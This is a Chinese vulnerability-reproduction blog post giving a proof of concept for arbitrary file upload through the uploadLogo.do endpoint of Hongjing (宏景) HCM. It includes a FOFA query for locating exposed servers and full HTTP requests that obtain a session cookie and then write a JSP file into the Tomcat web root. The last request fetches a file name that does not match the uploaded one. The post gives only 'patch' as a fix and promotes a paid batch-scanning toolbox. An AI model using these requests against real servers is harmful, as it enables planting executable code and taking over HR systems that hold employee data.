#  宏景HCM uploadLogo.do接口存在任意文件上传漏洞 附POC   
2024-11-21更新  南风漏洞复现文库   2024-11-21 03:34  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. 宏景HCM 口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
宏景HCM  
## 2.漏洞描述  
  
宏景HCM uploadLogo.do接口存在任意文件上传漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
宏景HCM  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjKfnXptmZFVIFurNCIyogoqCbBhficXBr6gtZoaehaNYfj6sQTLl64eg/640?wx_fmt=png&from=appmsg "null")  
  
宏景HCM uploadLogo.do接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
body='<div class="hj-hy-all-one-logo"'  
## 5.漏洞复现  
  
漏洞数据包：  
  
第一步，获取cookie  
```
GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKj5jDHriavYqibynSuaVeZwaTQ9SGpwVmWJlJqciajpRibrNg666XJhPWmNg/640?wx_fmt=jpeg&from=appmsg "null")  
  
第二部，获取路径  
```
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent:Mozilla/4.0(compatible; MSIE 8.0;Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept:*/*
Connection: close
Cookie: JSESSIONID=7EF0DA3260081E4BE81B06CA145761FB
Content-Length: 587
Content-Type: multipart/form-data; boundary=09040231427371112abff3a2a34c3efe

--09040231427371112abff3a2a34c3efe
Content-Disposition: form-data; name="path"


--09040231427371112abff3a2a34c3efe
Content-Disposition: form-data; name="lfType"

0
--09040231427371112abff3a2a34c3efe
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

<%= "bttest1" %>
--09040231427371112abff3a2a34c3efe
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<%= "bttest1" %>
--09040231427371112abff3a2a34c3efe
Content-Disposition: form-data; name="param"

param
--09040231427371112abff3a2a34c3efe--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjA98d04UlIPqb98ppIh9v7mLLQ0CtRm9XAdzUvqVLj6B315Hx60l3cA/640?wx_fmt=jpeg&from=appmsg "null")  
  
第三步，上传文件  
```
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent:Mozilla/5.0(Windows NT 10.0;Win64; x64; rv:108.0)Gecko/20100101Firefox/108.0
Cookie: JSESSIONID=163CC9FFC3CAAEAFCF07F29B294E99F0
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r

------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="path"

D~3a~5cTomcat~39~5cwebapps~5cROOT~5ctest1.jsp
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

<%="bttest1"%>
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<%="bttest1"%>
------WebKitFormBoundaryfjKBvGWJbG07Z02r--

```  
  
访问上传文件路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjvsticOMrFHsiamm2Pqo6tD38uFHqiawyhwGHFbqbmE0AE66EQkzIxXjnQ/640?wx_fmt=png&from=appmsg "")  
```
GET /test123.jsp HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Cookie: JSESSIONID=7EF0DA3260081E4BE81B06CA145761FB; 
```  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：  
南风网络安全  
  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjeTBWRvwxkQhJpmWpp6BlCJPib9fSawMY8WIQhvPCA2IQ6AejPICa16Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKj0vSX5RIgxElhrG0VHTXZLTn6S5X8KfFVODNtaciasJmaUgnoYWI9c5Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjlBJicBCzMeF9tPuxzPqLtrOBY3KvfYhyz6dGfa9snS6CDIxD4tO8THw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjGUQcadLmEpsVicXRicFmDRmoLPIck7FBOTGqOyLzWVpVRqNJjBfoYo5A/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YibTibmhLpvk4cHXyvALLaKjAy8Babvz90x0UtTD7qfYBQkhbFGIfVHWUu8CVhzuKsWuBb3A6XibjwA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
[D-Link多款产品account_mgr.cgi接口存在远程命令执行漏洞CVE-2024-10914 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487762&idx=1&sn=a25eeab4481350dc19897a38bb313f5e&chksm=974b9c15a03c150345340d9d369c94d55c2c09cdcc8328fb140109e9a753eb0550d703dd390f&scene=21#wechat_redirect)  
  
  
  
  
